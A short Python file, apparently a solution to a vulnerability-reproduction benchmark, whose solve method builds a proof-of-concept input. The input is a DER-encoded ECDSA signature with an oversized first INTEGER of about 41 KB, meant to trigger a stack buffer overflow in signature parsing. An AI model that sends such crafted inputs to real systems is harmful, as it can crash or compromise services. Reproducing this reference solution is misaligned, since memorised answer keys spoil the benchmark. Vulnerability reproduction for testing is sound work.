import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow vulnerability in ECDSA signature parsing.
        The ground truth PoC length is 41798 bytes.
        We construct a valid ASN.1 DER SEQUENCE containing two INTEGERs, where the first INTEGER
        has a payload large enough to trigger the stack buffer overflow (approx 41KB).
        """
        
        def encode_length(n):
            """Encodes the length field for ASN.1 DER."""
            if n < 0x80:
                return bytes([n])
            else:
                s = b""
                temp = n
                while temp > 0:
                    s = bytes([temp & 0xFF]) + s
                    temp >>= 8
                if not s:
                    s = b"\x00"
                return bytes([0x80 | len(s)]) + s

        # Target total length: 41798 bytes
        # ASN.1 Structure: SEQUENCE { INTEGER r, INTEGER s }
        # Overhead calculation:
        #   Sequence Tag: 1 byte (0x30)
        #   Sequence Length: 3 bytes (0x82 XX XX for length ~41794)
        #   Integer1 Tag: 1 byte (0x02)
        #   Integer1 Length: 3 bytes (0x82 XX XX for length ~41787)
        #   Integer2 Tag: 1 byte (0x02)
        #   Integer2 Length: 1 byte (0x01)
        #   Integer2 Value: 1 byte (0x00)
        # Total Overhead = 1 + 3 + 1 + 3 + 1 + 1 + 1 = 11 bytes
        
        # Calculate necessary payload size for Integer 1
        total_target_size = 41798
        overhead = 11
        payload_size = total_target_size - overhead  # 41787 bytes

        # Construct Integer 1 (Large payload to overflow stack)
        # Using b'\x41' ('A') ensures the integer is interpreted as positive (MSB=0)
        int1_val = b'\x41' * payload_size
        int1_len_encoded = encode_length(len(int1_val))
        int1_data = b'\x02' + int1_len_encoded + int1_val

        # Construct Integer 2 (Small valid integer)
        int2_val = b'\x00'
        int2_len_encoded = encode_length(len(int2_val))
        int2_data = b'\x02' + int2_len_encoded + int2_val

        # Construct Sequence
        seq_content = int1_data + int2_data
        seq_len_encoded = encode_length(len(seq_content))
        poc = b'\x30' + seq_len_encoded + seq_content

        return poc